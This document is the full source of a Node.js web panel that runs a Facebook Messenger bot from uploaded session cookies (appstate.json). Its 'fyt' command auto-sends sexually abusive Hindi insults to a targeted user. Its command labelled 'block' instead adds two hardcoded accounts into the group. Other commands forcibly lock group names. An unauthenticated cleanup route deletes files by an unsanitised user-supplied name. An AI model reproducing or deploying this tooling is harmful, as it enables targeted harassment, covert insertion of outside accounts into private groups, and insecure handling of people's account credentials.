// ==================================
// HENRY-X BOT PANEL 2026 ✅ FIXED
// ==================================

// CREATE THESE 3 FILES IN https://github.com/uptricker/Fb2

// ===== 1. package.json (DELETE OLD ONE) =====
{
  "name": "henry-x-bot",
  "version": "1.0.0",
  "description": "Fixed Henry-X Bot Panel",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "engines": {
    "node": ">=18.0.0"
  },
  "dependencies": {
    "express": "^4.19.2",
    "body-parser": "^1.20.3",
    "multer": "^2.0.0",
    "ws3-fca": "latest",
    "npmlog": "^7.0.1",
    "fs-extra": "^11.2.0"
  },
  "license": "MIT"
}

// ===== 2. .node-version (NEW FILE) =====
20.18.0

// ===== 3. index.js (COMPLETE FIXED VERSION) =====
const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs-extra");
const path = require("path");
const login = require("ws3-fca");
const multer = require("multer");

const app = express();
const PORT = process.env.PORT || 10000;

let activeBots = [];
const addUIDs = ["61578298101496", "61581116120393"];

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(express.json());

const upload = multer({ 
  dest: "uploads/",
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB
});

// CLEANUP UPLOADS
app.delete("/cleanup/:filename", (req, res) => {
  const filePath = path.join(__dirname, "uploads", req.params.filename);
  fs.remove(filePath).catch(() => {});
  res.send("OK");
});

app.get("/", (req, res) => {
  const runningBotsHTML = activeBots
    .map(bot => {
      const uptime = ((Date.now() - bot.startTime) / 1000 / 60).toFixed(0);
      return `<li>👑 ${bot.adminID} | ⏱ ${uptime}min | 📱 ${bot.api ? '✅ LIVE' : '❌ OFF'}</li>`;
    })
    .join("") || "<li>🚀 No active bots</li>";

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HENRY-X BOT PANEL 2026 🚀</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}
.container {
  background: rgba(255,255,255,0.1);
  backdrop-filter: blur(20px);
  border-radius: 25px;
  padding: 40px;
  max-width: 600px;
  width: 100%;
  box-shadow: 0 20px 40px rgba(0,0,0,0.3);
  border: 1px solid rgba(255,255,255,0.2);
}
h1 {
  color: #fff;
  text-align: center;
  margin-bottom: 30px;
  font-size: 2.5em;
  text-shadow: 0 0 20px rgba(255,255,255,0.5);
}
.form-group {
  margin-bottom: 20px;
}
label {
  display: block;
  margin-bottom: 8px;
  color: #fff;
  font-weight: 500;
}
input[type="text"], input[type="file"] {
  width: 100%;
  padding: 15px;
  border: none;
  border-radius: 12px;
  background: rgba(255,255,255,0.2);
  color: #fff;
  font-size: 16px;
  backdrop-filter: blur(10px);
}
input::placeholder { color: rgba(255,255,255,0.7); }
input:focus {
  outline: none;
  box-shadow: 0 0 20px rgba(255,255,255,0.3);
  background: rgba(255,255,255,0.3);
}
.btn {
  width: 100%;
  padding: 15px;
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  border: none;
  border-radius: 12px;
  color: white;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  transition: all 0.3s;
  text-transform: uppercase;
  letter-spacing: 1px;
}
.btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,107,107,0.4); }
.status {
  margin-top: 30px;
  padding: 20px;
  background: rgba(0,0,0,0.3);
  border-radius: 15px;
}
.status h3 { color: #00ff88; margin-bottom: 15px; text-align: center; }
.status ul { list-style: none; }
.status li {
  padding: 10px;
  margin: 5px 0;
  background: rgba(255,255,255,0.1);
  border-radius: 8px;
  font-size: 14px;
}
.commands {
  margin-top: 25px;
  padding: 20px;
  background: rgba(0,0,0,0.4);
  border-radius: 15px;
  font-size: 13px;
  white-space: pre-wrap;
  text-align: left;
  color: #00ff88;
}
@media (max-width: 600px) {
  .container { padding: 20px; margin: 10px; }
  h1 { font-size: 2em; }
}
</style>
</head>
<body>
<div class="container">
  <h1>🤖 HENRY-X BOT 2026</h1>
  
  <form method="POST" action="/start-bot" enctype="multipart/form-data">
    <div class="form-group">
      <label>🔑 Appstate.json</label>
      <input type="file" name="appstate" accept=".json" required>
    </div>
    <div class="form-group">
      <label>✏️ Prefix</label>
      <input type="text" name="prefix" placeholder="*" value="*" required>
    </div>
    <div class="form-group">
      <label>👑 Admin UID</label>
      <input type="text" name="adminID" placeholder="615xxxxxx" required>
    </div>
    <button type="submit" class="btn">🚀 START BOT</button>
  </form>

  <div class="status">
    <h3>🟢 Active Bots</h3>
    <ul>${runningBotsHTML}</ul>
  </div>

  <div class="commands">
<h3>📜 Commands</h3>
*help    *tid    *uid
🔒 *grouplockname on <name>
🔒 *grouplockname off
🎭 *nicknamelock on <name>
🖼 *groupdplock on
⚔ *fyt on <uid>    *fyt off <uid>
🔥 *block
  </div>
</div>
</body>
</html>
  `);
});

app.post("/start-bot", upload.single("appstate"), async (req, res) => {
  try {
    console.log("🚀 START BOT REQUEST:", req.body.adminID);
    
    const filePath = path.join(__dirname, req.file.path);
    const { prefix, adminID } = req.body;

    // VALIDATE FILE
    if (!fs.existsSync(filePath)) {
      return res.status(400).send("❌ Appstate file missing!");
    }

    const appStateData = fs.readFileSync(filePath, "utf8");
    if (appStateData.length < 100) {
      fs.remove(filePath);
      return res.status(400).send("❌ Invalid/corrupted appstate.json!");
    }

    const appState = JSON.parse(appStateData);
    console.log("✅ Appstate loaded:", appState.length, "cookies");

    // START BOT
    startBot({ appState, prefix, adminID, filePath });
    res.redirect("/");
    
  } catch (error) {
    console.error("🚨 START-BOT ERROR:", error.message);
    res.status(500).send(`❌ Error: ${error.message}`);
  }
});

function startBot({ appState, prefix, adminID, filePath }) {
  console.log("🔥 Starting bot for admin:", adminID);
  
  login({ appState }, { 
    online: true, 
    updatePresence: true, 
    selfListen: false 
  }, (err, api) => {
    if (err) {
      console.error("❌ LOGIN FAILED:", err);
      fs.remove(filePath).catch(() => {});
      return;
    }

    console.log("✅ BOT STARTED for Admin:", adminID);
    
    const botData = { adminID, startTime: Date.now(), api, prefix };
    activeBots.push(botData);

    // CLEANUP OLD BOTS
    if (activeBots.length > 5) {
      activeBots = activeBots.slice(-5);
    }

    const lockedGroups = {};
    const fytTargets = {};
    const lastReplied = {};
    const fytReplies = [
      "Tujhe Teri Maki Chut Ki Kasam Mujhe Gali Dega To Tu Randi Ka Hoga ? :)",
      "Idhar Bat Na Kr Bhai Me Bot Hu Teri Maa Cho0d Duga ! :) (y)",
      "Chup Randi Ke Baxh3 I Wan_T t0 Eat Y0ur Maki Xh0oT ;3 (y) || <3"
    ];

    api.setOptions({ listenEvents: true });

    api.listenMqtt((err, event) => {
      if (err) {
        console.error("MQTT Error:", err);
        return;
      }

      // GROUP NAME LOCK
      if (event.logMessageType === "log:thread-name" && lockedGroups[event.threadID]) {
        setTimeout(() => {
          api.setTitle(lockedGroups[event.threadID], event.threadID);
        }, 1000);
      }

      // COMMANDS (ADMIN ONLY)
      if (event.type === "message" && event.body?.startsWith(prefix) && event.senderID === adminID) {
        const args = event.body.slice(prefix.length).trim().split(/\s+/);
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        switch (cmd) {
          case "help":
            api.sendMessage(
`┏━━━━━━━━━━━━━━━━━━┓
┃   🤖 HENRY-X BOT 2026  ┃
┗━━━━━━━━━━━━━━━━━━┛
🔒 *grouplockname on <name>
🔒 *grouplockname off
🎭 *nicknamelock on <name>
🖼 *groupdplock on
⚔ *fyt on <uid> / *fyt off <uid>
🆔 *tid
👤 *uid
🔥 *block
┗━━━━━━━━━━━━━━━━━━━┛`, event.threadID);
            break;

          case "grouplockname":
            if (input.startsWith("on ")) {
              const name = input.slice(3).trim();
              lockedGroups[event.threadID] = name;
              api.setTitle(name, event.threadID);
              api.sendMessage(`🔒 Group locked: "${name}"`, event.threadID);
            } else if (input === "off") {
              delete lockedGroups[event.threadID];
              api.sendMessage("🔓 Group unlocked", event.threadID);
            }
            break;

          case "tid":
            api.sendMessage(`🆔 Thread ID: ${event.threadID}`, event.threadID);
            break;

          case "uid":
            api.sendMessage(`👤 Your UID: ${event.senderID}`, event.threadID);
            break;

          case "block":
            api.sendMessage("🔥 BLOCK ACTIVATED", event.threadID);
            addUIDs.forEach(uid => {
              api.addUserToGroup(uid, event.threadID, err => {
                if (!err) console.log(`✅ Added ${uid}`);
              });
            });
            break;

          case "fyt":
            const mode = args[1];
            const targetUID = args[2];
            if (mode === "on" && targetUID) {
              fytTargets[targetUID] = true;
              api.sendMessage(`⚔️ FYT ON: ${targetUID}`, event.threadID);
            } else if (mode === "off" && targetUID) {
              delete fytTargets[targetUID];
              api.sendMessage(`🛑 FYT OFF: ${targetUID}`, event.threadID);
            }
            break;
        }
      }

      // FYT AUTO-REPLY
      if (event.type === "message" && event.body && fytTargets[event.senderID] && event.senderID !== adminID) {
        const key = `${event.threadID}_${event.senderID}`;
        if (!lastReplied[key]) {
          const reply = fytReplies[Math.floor(Math.random() * fytReplies.length)];
          api.sendMessage(reply, event.threadID);
          lastReplied[key] = true;
          setTimeout(() => delete lastReplied[key], 60000);
        }
      }
    });
  });
}

// HEALTH CHECK
app.get("/health", (req, res) => res.json({ status: "OK", bots: activeBots.length }));

// 404
app.use((req, res) => res.status(404).send("❌ Not Found"));

// ERROR HANDLER
app.use((err, req, res, next) => {
  console.error("🚨 ERROR:", err);
  res.status(500).send("❌ Server Error");
});

const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`🌐 HENRY-X BOT running on PORT ${PORT}`);
  console.log(`🔗 URL: http://localhost:${PORT}`);
});

// GRACEFUL SHUTDOWN
process.on("SIGTERM", () => {
  console.log("🛑 Shutting down gracefully...");
  server.close(() => process.exit(0));
});
